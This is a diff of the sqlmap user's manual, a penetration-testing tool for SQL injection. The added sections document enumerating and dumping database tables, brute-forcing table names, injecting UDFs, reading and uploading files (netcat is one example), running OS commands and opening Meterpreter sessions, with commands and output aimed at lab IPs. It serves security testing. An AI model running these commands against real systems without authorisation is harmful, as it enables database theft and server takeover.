@@ -3,12 +3,14 @@ by [Bernardo Damele A. G.](mailto:bernardo@sqlmap.org) and [Miroslav Stampar](ma
 version 1.0-dev, XXX XX, 2012
 
 # Abstract
+
 This document is the user's manual for [sqlmap](http://www.sqlmap.org).
 
 # Introduction
 sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
 
 ## Requirements
+
 sqlmap is developed in [python](http://www.python.org), a dynamic, object-oriented, interpreted programming language freely available from [http://python.org/download/](http://python.org/download/). This makes sqlmap a cross-platform application which is independant of the operating system. sqlmap requires Python version **2.6** or above. To make it even easier, many GNU/Linux distributions come out of the box with Python installed. Other Unixes and Mac OSX also provide Python packaged and ready to be installed. Windows users can download and install the Python installer for x86, AMD64 and Itanium.
 
 sqlmap relies on the [Metasploit Framework](http://metasploit.com) for some of its post-exploitation takeover features. You need to grab a copy of the framework from the [download](http://metasploit.com/download/) page - the required version is **3.5** or higher. For the ICMP tunneling out-of-band takeover technique, sqlmap requires the [Impacket](http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=Impacket) library too.
@@ -31,17 +33,21 @@ Optionally, if you are running sqlmap on Windows, you may wish to install the [P
 ## Scenario
 
 ### Detect and exploit a SQL injection
+
 Let's say that you are auditing a web application and found a web page that accepts dynamic user-provided values via `GET`, `POST` or `Cookie` parameters or via the HTTP `User-Agent` request header.
 You now want to test if these are affected by a SQL injection vulnerability, and if so, exploit them to retrieve as much information as possible from the back-end database management system, or even be able to access the underlying file system and operating system.
 
 In a simple world, consider that the target url is:
-`http://192.168.136.131/sqlmap/mysql/get_int.php?id=1`
+
+    http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
 
 Assume that:
-`http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1`
+
+    http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1
 
 is the same page as the original one and (the condition evaluates to **True**):
-`http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2`
+
+    http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2
 
 differs from the original one (the condition evaluates to **False**). This likely means that you are in front of a SQL injection vulnerability in the `id` `GET` parameter of the `index.php` page. Additionally, no sanitisation of user's supplied input is taking place before the SQL statement is sent to the back-end database management system.
 
@@ -51,27 +57,20 @@ Now that you have found the vulnerable parameter, you can exploit it by manipula
 
 Back to the scenario, we can make an educated guess about the probable syntax of the SQL `SELECT` statement where the user supplied value is being used in the `get_int.php` web page. In pseudo PHP code:
 
-`$query = "SELECT [column name(s)] FROM [table name] WHERE id=" . $_REQUEST['id'];`
+    $query = "SELECT [column name(s)] FROM [table name] WHERE id=" . $_REQUEST['id'];
 
-As you can see, appending a syntactically valid SQL statement that will evaluate to a **True** condition after the value for the `id` parameter (such as `id=1 AND 1=1`) will result in the web application returning the same web page as in the original request (where no SQL statement is added).
-This is because the back-end database management system has evaluated the
-injected SQL statement. The previous example describes a simple boolean-based blind SQL injection
-vulnerability.  However, sqlmap is able to detect any type of SQL injection flaw and adapt
-its work-flow accordingly. 
+As you can see, appending a syntactically valid SQL statement that will evaluate to a **True** condition after the value for the `id` parameter (such as `id=1 AND 1=1`) will result in the web application returning the same web page as in the original request (where no SQL statement is added). This is because the back-end database management system has evaluated the injected SQL statement. The previous example describes a simple boolean-based blind SQL injection vulnerability.  However, sqlmap is able to detect any type of SQL injection flaw and adapt its work-flow accordingly.
 
 In this simple scenario it would also be possible to append, not just one or more valid SQL conditions, but also (depending on the DBMS) stacked SQL queries. For instance:  `[...]&id=1;ANOTHER SQL QUERY#`.
 
 sqlmap can automate the process of identifying and exploiting this type of vulnerability. Passing the original address, `http://192.168.136.131/sqlmap/mysql/get_int.php?id=1` to sqlmap, the tool will automatically:
 
 * Identify the vulnerable parameter(s) (`id` in this example)
-* Identify which SQL injection techniques can be used to exploit the
-vulnerable parameter(s)
+* Identify which SQL injection techniques can be used to exploit the vulnerable parameter(s)
 * Fingerprint the back-end database management system
-* Depending on the user's options, it will extensively fingerprint,
-enumerate data or takeover the database server as a whole
+* Depending on the user's options, it will extensively fingerprint, enumerate data or takeover the database server as a whole
 
-...and depending on supplied options, it will enumerate data or takeover the
-database server entirely.
+...and depending on supplied options, it will enumerate data or takeover the database server entirely.
 
 There exist many [resources](http://delicious.com/inquis/sqlinjection) on the web explaining in depth how to detect, exploit and prevent SQL injection vulnerabilities in web applications. It is recommendeded that you read them before going much further with sqlmap.
 
@@ -95,8 +94,11 @@ parameter in the HTTP request, a semi-colon (`;`) followed by the SQL statement 
 You can watch several demo videos on [YouTube](http://www.youtube.com/user/inquisb). Also, you can find lots of examples against publicly available vulnerable web applications made for legal web assessment [here](http://unconciousmind.blogspot.com/search/label/sqlmap).
 
 # Features
+
 Features implemented in sqlmap include:
+
 ## Generic features
+
 * Full support for **MySQL**, **Oracle**, **PostgreSQL**, **Microsoft SQL Server**, **Microsoft Access**, **SQLite**, **Firebird**, **Sybase** and **SAP MaxDB** database management systems.
 * Full support for five SQL injection techniques: **boolean-based blind**, **time-based blind**, **error-based**, **UNION query** and **stacked queries**.
 * Support to **directly connect to the database** without passing via a SQL injection, by providing DBMS credentials, IP address, port and database name.
@@ -120,6 +122,7 @@ Features implemented in sqlmap include:
 * Integration with other IT security open source projects, (http://metasploit.com "Metasploit) and [w3af](http://w3af.sourceforge.net/).
 
 ## Fingerprint and enumeration features
+
 * **Extensive back-end database software version and underlying operating system fingerprint** based upon
 [error messages](http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html),
 [banner parsing](http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html),
@@ -136,6 +139,7 @@ not store this information anywhere (e.g. MySQL < 5.0).
 * Support to **run custom SQL statement(s)** as in an interactive SQL client connecting to the back-end database. sqlmap automatically dissects the provided statement, determines which technique fits best to inject it and how to pack the SQL payload accordingly.
 
 ## Takeover features
+
 Some of these techniques are detailed in the white paper
 [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857) and in the
 slide deck [Expanding the control over the operating system from the database](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).
@@ -159,14 +163,17 @@ sqlmap relies on Metasploit to create the shellcode and implements four differen
 # History
 
 ## 2012
+
 * **May 31**, Miroslav [presents](http://phdays.com/program/conference/) his research **DNS exfiltration using sqlmap** ([slides](http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281)) with accompanying [whitepaper](http://www.slideshare.net/stamparm/ph-days-2012miroslavstampardataretrievaloverdnsinsqlinjectionattackspaper) **Data Retrieval over DNS in SQL Injection Attacks** at PHDays 2012 in Moscow, Russia.
 
 ## 2011
+
 * **September 23**, Miroslav [presents](http://fsec.foi.hr/index.php/Miroslav_Stampar_-_It_all_starts_with_the_%27_-_SQL_injection_from_attackers_point_of_view) **It all starts with the ' (SQL injection from attacker's point of view)** ([slides](http://www.slideshare.net/stamparm/f-sec-2011miroslavstamparitallstartswiththesinglequote-9311238)) talking about methods attackers use in SQL injection attacks at FSec - FOI Security Symposium in Varazdin, Croatia.
 * **June 23**, Miroslav [presents](https://ep2012.europython.eu/conference/talks/sqlmap-security-developing-in-python) **sqlmap - security development in Python** ([slides](http://www.slideshare.net/stamparm/euro-python-2011miroslavstamparsqlmapsecuritydevelopmentinpython)) talking about sqlmap internals at EuroPython 2011 in Firenze, Italy.
 * **April 10**, [Bernardo and Miroslav](http://www.sqlmap.org/#developers) release sqlmap **0.9** featuring a totally rewritten and powerful SQL injection detection engine, the possibility to connect directly to a database server, support for time-based blind SQL injection and error-based SQL injection, support for four new database management systems and much more.
 
 ## 2010
+
 * **December**, [Bernardo and Miroslav](http://www.sqlmap.org/#developers) have enhanced sqlmap a lot during the whole year and prepare to release sqlmap **0.9** within the first quarter of 2011.
 * **June 3**, Bernardo [presents](http://www.slideshare.net/inquis/ath-con-2010bernardodamelegotdbownnet)
 a talk titled **Got database access? Own the network!** at AthCon 2010 in Athens (Greece).
@@ -176,6 +183,7 @@ sqlmap **0.8** featuring many features. Amongst these, support to enumerate and 
 * **January**, Bernardo is [invited](http://www.athcon.org/speakers/) to present at [AthCon](http://www.athcon.org/archives/2010-2/) conference in Greece on June 2010.
 
 ## 2009
+
 * **December 18**, [Miroslav Stampar](http://unconciousmind.blogspot.com/) replies to the call for developers. Along with Bernardo, he actively develops sqlmap from version **0.8 release candidate 2**.
 * **December 12**, Bernardo writes to the mailing list a post titled [sqlmap state of art - 3 years later](http://bernardodamele.blogspot.com/2009/12/sqlmap-state-of-art-3-years-later.html) highlighting the goals
 achieved during these first three years of the project and launches a call for developers.
@@ -204,6 +212,7 @@ an updated version of his **SQL injection: Not only AND 1=1** slides at [2nd Dig
 * **January 9**, Bernardo [presents](http://www.slideshare.net/inquis/sql-injection-exploitation-internals-presentation) **SQL injection exploitation internals** at a private event in London, UK.
 
 ## 2008
+
 * **December 18**, sqlmap **0.6.3** is released featuring support to retrieve targets from Burp and WebScarab proxies log files, support to test for stacked queries ant time-based blind SQL injection, rough fingerprint of the web server and web application technologies in use and more options to customize the HTTP requests and enumerate more information from the database.
 * **November 2**, sqlmap version **0.6.2** is a "bug fixes" release only.
 * **October 20**, sqlmap first point release, **0.6.1**, goes public. This includes minor bug fixes and the first contact between the tool and [Metasploit](http://metasploit.com): an auxiliary module to launch sqlmap from within Metasploit Framework. The [subversion development repository](https://svn.sqlmap.org/sqlmap/trunk/sqlmap/) goes public again.
@@ -212,6 +221,7 @@ an updated version of his **SQL injection: Not only AND 1=1** slides at [2nd Dig
 * **January**, sqlmap subversion development repository is moved away from SourceForge and goes private for a while.
 
 ## 2007
+
 * **November 4**, release **0.5** marks the end of the OWASP Spring of Code 2007 contest participation. Bernardo has [accomplished](http://www.owasp.org/index.php/SpoC_007_-_SQLMap_-_Progress_Page) all the proposed objects which include also initial support for Oracle, enhanced support for UNION query SQL injection and support to test and exploit SQL injections in HTTP Cookie and User-Agent headers.
 * **June 15**, Bernardo releases version **0.4** as a result of the first OWASP Spring of Code 2007 milestone. This release features, amongst others, improvements to the DBMS fingerprint engine, support to calculate the estimated time of arrival, options to enumerate specific data from the database server and brand new logging system.
 * **April**, even though sqlmap was **not** and is **not** an OWASP project, it gets [accepted](http://www.owasp.org/index.php/SpoC_007_-_SqlMap), amongst many other open source projects to OWASP Spring
@@ -220,6 +230,7 @@ of Code 2007.
 * **January 20**, sqlmap version **0.3** is released, featuring initial support for Microsoft SQL Server, support to test and exploit UNION query SQL injections and injection points in POST parameters.
 
 ## 2006
+
 * **December 13**, Bernardo releases version **0.2** with major enhancements to the DBMS fingerprint functionalities and replacement of the old inference algorithm with the bisection algorithm.
 * **September**, Daniele leaves the project, [Bernardo Damele A. G.](http://bernardodamele.blogspot.com)
 takes it over.
@@ -229,6 +240,7 @@ limited support for MySQL added.
 
 
 # Download and update
+
 sqlmap can be downloaded from its [SourceForge File List page](http://sourceforge.net/projects/sqlmap/files/). It is available in two formats:
 * [Source gzip compressed](http://downloads.sourceforge.net/sqlmap/sqlmap-0.9.tar.gz)
 * [Source zip compressed](http://downloads.sourceforge.net/sqlmap/sqlmap-0.9.zip)
@@ -465,6 +477,7 @@ This is strongly recommended **before** reporting any bug to the [mailing list](
         --wizard            Simple wizard interface for beginner users
 
 ## Output verbosity
+
 Switch: `-v`
 
 This switch can be used to set the verbosity level of output messages. There exist **seven** levels of verbosity. The default level is **1** in which information, warning, error and critical messages and Python tracebacks (if any occur) will be displayed.
@@ -480,6 +493,7 @@ This switch can be used to set the verbosity level of output messages. There exi
 A reasonable level of verbosity to further understand what sqlmap does under the hood is level **2**, primarily for the detection phase and the take-over functionalities. Whereas if you want to see the SQL payloads the tools sends, level **3** is your best choice. In order to further debug potential bugs or unexpected behaviours, we recommend you to set the verbosity to level **4** or above. This level is recommended to be used when you feed the developers with a bug report too.
 
 ## Target
+
 At least one of these options has to be provided.
 
 ### Target URL
@@ -770,7 +784,7 @@ By default sqlmap automatically detects the web application's back-end database 
 * Sybase
 * SAP MaxDB
 
-If for any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identified or if you want to avoid an active fingeprint, you can provide the name of the back-end DBMS yourself (e.g. `postgresql`). For MySQL and Microsoft SQL Server provide them respectively in the form `MySQL &lt;version&gt;` and `Microsoft SQL Server &lt;version&gt; `, where `&lt;version&gt;` is a valid version for the DBMS; for instance `5.0` for MySQL and `2005` for Microsoft SQL Server.
+If for any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identified or if you want to avoid an active fingeprint, you can provide the name of the back-end DBMS yourself (e.g. `postgresql`). For MySQL and Microsoft SQL Server provide them respectively in the form `MySQL  <version>` and `Microsoft SQL Server  <version> `, where ` <version>` is a valid version for the DBMS; for instance `5.0` for MySQL and `2005` for Microsoft SQL Server.
 
 In case you provide `--fingerprint` together with `--dbms`, sqlmap will only perform the extensive fingerprint for the specified database management system only, read below for further details. 
 
@@ -847,7 +861,7 @@ The format of a valid tamper script is as follows:
 
 You can check valid and usable tamper scripts in the `tamper/` directory.
 
-Example against a MySQL target assuming that `&gt;` character, spaces and capital `SELECT` string are banned:
+Example against a MySQL target assuming that `>` character, spaces and capital `SELECT` string are banned:
 
     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper \
     tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
@@ -1072,3 +1086,656 @@ When the session user has read access to the system table containing information
 
 If you do not provide a specific database with switch `-D`, sqlmap will enumerate the tables for all DBMS databases.
 
+You can also provide the `--exclude-sysdbs` switch to exclude all system databases.
+
+Note that on Oracle you have to provide the `TABLESPACE_NAME` instead of the database name.
+
+### Enumerate database table columns
+
+Switches: `--columns`, `-C`, `-T` and `-D`
+
+When the session user has read access to the system table containing information about database's tables, it is possible to enumerate the list of columns for a specific database table. sqlmap also enumerates the data-type for each column. 
+
+This feature depends on the option `-T` to specify the table name and optionally on `-D` to specify the database name. When the database name is not specified, the current database name is used. You can also provide the `-C` option to specify the table columns name like the one you provided to be enumerated.
+
+Example against a SQLite target:
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns \
+    -D testdb -T users -C name
+    [...]
+    Database: SQLite_masterdb
+    Table: users
+    [3 columns]
+    +---------+---------+
+    | Column  | Type    |
+    +---------+---------+
+    | id      | INTEGER |
+    | name    | TEXT    |
+    | surname | TEXT    |
+    +---------+---------+
+
+
+Note that on PostgreSQL you have to provide `public` or the name of a system database. That's because it is not possible to enumerate  other databases tables, only the tables under the schema that the web application's user is connected to, which is always aliased by `public`. 
+
+### Enumerate database management system schema
+
+Switches: `--schema`
+
+[TODO]
+
+### Retrieve number of entries for table(s)
+
+Switches: `--count`
+
+[TODO]
+
+### Dump database table entries
+
+Switches: `--dump`, `-C`, `-T`, `-D`, `--start`, `--stop`, `--first` and `--last`
+
+When the session user has read access to a specific database's table it is possible to dump the table entries.
+
+This functionality depends on switch `-T` to specify the table name and optionally on switch `-D` to specify the database name. If the table name is provided, but the database name is not, the current database name is used.
+
+Example against a Firebird target:
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
+    [...]
+    Database: Firebird_masterdb
+    Table: USERS
+    [4 entries]
+    +----+--------+------------+
+    | ID | NAME   | SURNAME    |
+    +----+--------+------------+
+    | 1  | luther | blisset    |
+    | 2  | fluffy | bunny      |
+    | 3  | wu     | ming       |
+    | 4  | NULL   | nameisnull |
+    +----+--------+------------+
+
+This switch can also be used to dump all tables' entries of a provided database. You simply have to provide sqlmap with the `--dump` switch along with only the `-D` switch, no `-T` and no `-C`. 
+
+You can also provide a comma-separated list of the specific columns to dump with the `-C` switch.
+
+sqlmap also generates for each table dumped the entries in a CSV format textual file. You can see the absolute path where sqlmap creates the file by providing a verbosity level greater than or equal to **1**.
+
+If you want to dump only a range of entries, then you can provide switches `--start` and/or `--stop` to respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you want to dump only the first entry, provide `--stop 1` in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide `--start 1` `--stop 3`.
+
+It is also possible to specify which single character or range of characters to dump with switches `--first` and `--last`. For instance, if you want to dump columns' entries from the third to the fifth character, provide `--first 3` `--last 5`. This feature only applies to the blind SQL injection techniques because for error-based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column's entry output to dump.
+
+As you may have noticed by now, sqlmap is **flexible**: you can leave it to automatically dump the whole database table or you can be very precise in which characters to dump, from which columns and which range of entries.
+
+### Dump all databases tables entries
+
+Switches: `--dump-all` and `--exclude-sysdbs`
+
+It is possible to dump all databases tables entries at once that the session user has read access on.
+
+You can also provide the `--exclude-sysdbs` switch to exclude all system databases. In that case sqlmap will only dump entries of users' databases tables.
+
+Note that on Microsoft SQL Server the `master` database is not considered a system database because some database administrators use it as a users' database.
+
+### Search for columns, tables or databases
+
+Switches: `--search`, `-C`, `-T`, `-D`
+
+This switch allows you to **search for specific database names, specific tables across all databases or specific columns across all databases' tables**. 
+
+This is useful, for instance, to identify tables containing custom application credentials where relevant columns' names contain string like _name_ and _pass_.
+
+The switch `--search` needs to be used in conjunction with one of the following support switches:
+
+* `-C` following a list of comma-separated column names to look for across the whole database management system.
+* `-T` following a list of comma-separated table names to look for across the whole database management system.
+* `-D` following a list of comma-separated database names to look for across the database management system.
+
+### Run custom SQL statement
+
+Switches: `--sql-query` and `--sql-shell`
+
+The SQL query and the SQL shell features allow to run arbitrary SQL statements on the database management system. sqlmap automatically dissects the provided statement, determines which technique is appropriate to use to inject it and how to pack the SQL payload accordingly. 
+
+If the query is a `SELECT` statement, sqlmap will retrieve its output. Otherwise it will execute the query through the stacked query SQL injection technique if the web application supports multiple statements on the back-end database management system. Beware that some web application technologies do not support stacked queries on specific database management systems. For instance, PHP does not support stacked queries when the back-end DBMS is MySQL, but it does support when the back-end DBMS is PostgreSQL.
+
+Examples against a Microsoft SQL Server 2000 target:
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
+    "SELECT 'foo'" -v 1
+
+    [...]
+    [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
+    [hh:mm:14] [INFO] retrieved: foo
+    SELECT 'foo':    'foo'
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
+    "SELECT 'foo', 'bar'" -v 2
+
+    [...]
+    [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
+    [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
+    distinct queries to be able to retrieve the output even if we are going blind
+    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), 
+    (CHAR(32)))
+    [hh:mm:50] [INFO] retrieved: foo
+    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+    [hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), 
+    (CHAR(32)))
+    [hh:mm:50] [INFO] retrieved: bar
+    [hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
+    SELECT 'foo', 'bar':    'foo, bar'
+
+As you can see, sqlmap splits the provided query into two different `SELECT` statements then retrieves the output for each separate query. 
+
+If the provided query is a `SELECT` statement and contains a `FROM` clause, sqlmap will ask you if such statement can return multiple entries. In that case the tool knows how to unpack the query correctly to count the number of possible entries and retrieve its output, entry per entry. 
+
+The SQL shell option allows you to run your own SQL statement interactively, like a SQL console connected to the database management system. This feature provides TAB completion and history support too. 
+
+## Brute force
+
+These options can be used to run brute force checks.
+
+### Brute force tables names
+
+Switches: `--common-tables`
+
+There are cases where `-`-`tables` switch can not be used to retrieve the databases' table names. These cases usually fit into one of the following categories: 
+
+* The database management system is MySQL ** < 5.0** where `information_schema` is not available.
+* The database management system is Microsoft Access and system table `MSysObjects` is not readable - default setting.
+* The session user does not have read privileges against the system table storing the scheme of the databases.
+
+If any of the first two cases apply and you provided the `-`-`tables` switch, sqlmap will prompt you with a question
+to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-tables` switch. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.
+
+The list of common table names is `txt/common-tables.txt` and you can edit it as you wish.
+
+Example against a MySQL 4.1 target:
+
+    $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" \
+    --common-tables -D testdb --banner
+
+    [...]
+    [hh:mm:39] [INFO] testing MySQL
+    [hh:mm:39] [INFO] confirming MySQL
+    [hh:mm:40] [INFO] the back-end DBMS is MySQL
+    [hh:mm:40] [INFO] fetching banner
+    web server operating system: Windows
+    web application technology: PHP 5.3.1, Apache 2.2.14
+    back-end DBMS operating system: Windows
+    back-end DBMS: MySQL < 5.0.0
+    banner:    '4.1.21-community-nt'
+
+    [hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
+    [hh:mm:40] [INFO] adding words used on web page to the check list
+    please enter number of threads? [Enter for 1 (current)] 8
+    [hh:mm:43] [INFO] retrieved: users
+
+    Database: testdb
+    [1 table]
+    +-------+
+    | users |
+    +-------+
+
+### Brute force columns names
+
+Switches: `--common-columns`
+
+As per tables, there are cases where `-`-`columns` switch can not be used to retrieve the databases' tables' column names. These cases usually fit into one of the following categories: 
+
+* The database management system is MySQL ** < 5.0** where `information_schema` is not available.
+* The database management system is Microsoft Access where this kind of information is not available inside system tables.
+* The session user does not have read privileges against the system table storing the scheme of the databases.
+
+If any of the first two cases apply and you provided the `-`-`columns` switch, sqlmap will prompt you with a question
+to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-columns` switch. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.
+
+The list of common table names is `txt/common-columns.txt` and you can edit it as you wish.
+
+## User-defined function injection
+
+These options can be used to create custom user-defined functions.
+
+### Inject custom user-defined functions (UDF)
+
+Switches: `--udf-inject` and `--shared-lib`
+
+You can inject your own user-defined functions (UDFs) by compiling a MySQL or PostgreSQL shared library, DLL for Windows and shared object for Linux/Unix, then provide sqlmap with the path where the shared library is stored locally on your machine. sqlmap will then ask you some questions, upload the shared library on the database server file system, create the user-defined function(s) from it and, depending on your options, execute them. When you are finished using the injected UDFs, sqlmap can also remove them from the database for you. 
+
+These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).
+
+Use switch `--udf-inject` and follow the instructions.
+
+If you want, you can specify the shared library local file system path via command line too by using `--shared-lib` option. Vice versa sqlmap will ask you for the path at runtime.
+
+This feature is available only when the database management system is MySQL or PostgreSQL.
+
+## File system access
+
+### Read a file from the database server's file system
+
+Switch: `--file-read`
+
+It is possible to retrieve the content of files from the underlying file system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual or a binary file. sqlmap will handle it properly. 
+
+These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).
+
+Example against a Microsoft SQL Server 2005 target to retrieve a binary file:
+
+    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+    --file-read "C:/example.exe" -v 1
+
+    [...]
+    [hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
+    web server operating system: Windows 2000
+    web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+    back-end DBMS: Microsoft SQL Server 2005
+
+    [hh:mm:50] [INFO] fetching file: 'C:/example.exe'
+    [hh:mm:50] [INFO] the SQL query provided returns 3 entries
+    C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'
+    [...]
+
+    $ ls -l output/192.168.136.129/files/C__example.exe 
+    -rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
+
+    $ file output/192.168.136.129/files/C__example.exe 
+    output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
+    80386 32-bit
+
+### Upload a file to the database server's file system
+
+Switches: `--file-write` and `--file-dest`
+
+It is possible to upload a local file to the database server's file system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual or a binary file. sqlmap will handle it properly. 
+
+These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).
+
+Example against a MySQL target to upload a binary UPX-compressed file:
+
+    $ file /software/nc.exe.packed 
+    /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
+
+    $ ls -l /software/nc.exe.packed
+    -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
+
+    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
+    "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
+
+    [...]
+    [hh:mm:29] [INFO] the back-end DBMS is MySQL
+    web server operating system: Windows 2003 or 2008
+    web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
+    back-end DBMS: MySQL >= 5.0.0
+
+    [...]
+    do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully 
+    written on the back-end DBMS file system? [Y/n] y
+    [hh:mm:52] [INFO] retrieved: 31744
+    [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
+    same size as the local file '/software/nc.exe.packed'
+
+## Operating system takeover
+
+### Run arbitrary operating system command
+
+Switches: `--os-cmd` and `--os-shell`
+
+It is possible to **run arbitrary commands on the database server's underlying operating system** when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses.
+
+On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality explained above) a shared library (binary file) containing two user-defined functions, `sys_exec()` and `sys_eval()`, then it creates these two functions on the database and calls one of them to execute the specified command, depending on user's choice to display the standard output or not. On Microsoft SQL Server, sqlmap abuses the `xp_cmdshell` stored procedure: if it is disabled (by default on Microsoft SQL Server >= 2005), sqlmap re-enables it; if it does not exist, sqlmap creates it from scratch.
+
+When the user requests the standard output, sqlmap uses one of the enumeration SQL injection techniques (blind, inband or error-based) to retrieve it. Vice versa, if the standard output is not required, stacked query SQL injection technique is used to execute the command.
+
+These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).
+
+Example against a PostgreSQL target:
+
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
+    --os-cmd id -v 1
+
+    [...]
+    web application technology: PHP 5.2.6, Apache 2.2.9
+    back-end DBMS: PostgreSQL
+    [hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
+    [hh:mm:12] [INFO] the back-end DBMS operating system is Linux
+    [hh:mm:12] [INFO] testing if current user is DBA
+    [hh:mm:12] [INFO] detecting back-end DBMS version from its banner
+    [hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
+    [hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
+    [hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
+    [hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
+    do you want to retrieve the command standard output? [Y/n/a] y
+    command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'
+
+    [hh:mm:19] [INFO] cleaning up the database management system
+    do you want to remove UDF 'sys_eval'? [Y/n] y
+    do you want to remove UDF 'sys_exec'? [Y/n] y
+    [hh:mm:23] [INFO] database management system cleanup finished
+    [hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can 
+    only be deleted manually
+
+It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The option is `--os-shell` and has the same TAB completion and history functionalities that `--sql-shell` has. 
+
+Where stacked queries has not been identified on the web application (e.g. PHP or ASP with back-end database management system being MySQL) and the DBMS is MySQL, it is still possible to abuse the `SELECT` clause's `INTO OUTFILE` to create a web backdoor in a writable folder within the web server document root and still get command execution assuming the back-end DBMS and the web server are hosted on the same server. sqlmap supports this technique and allows the user to provide a comma-separated list of possible document root sub-folders where try to upload the web file stager and the subsequent web backdoor. Also, sqlmap has its own tested web file stagers and backdoors for the following languages: 
+
+* ASP
+* ASP.NET
+* JSP
+* PHP
+
+### Out-of-band stateful connection: Meterpreter & friends
+
+Switches: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` and `--tmp-path`
+
+It is possible to establish an **out-of-band stateful TCP connection between the attacker machine and the database server** underlying operating system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice. 
+
+sqlmap relies on Metasploit to create the shellcode and implements four different techniques to execute it on the database server. These techniques are:
+
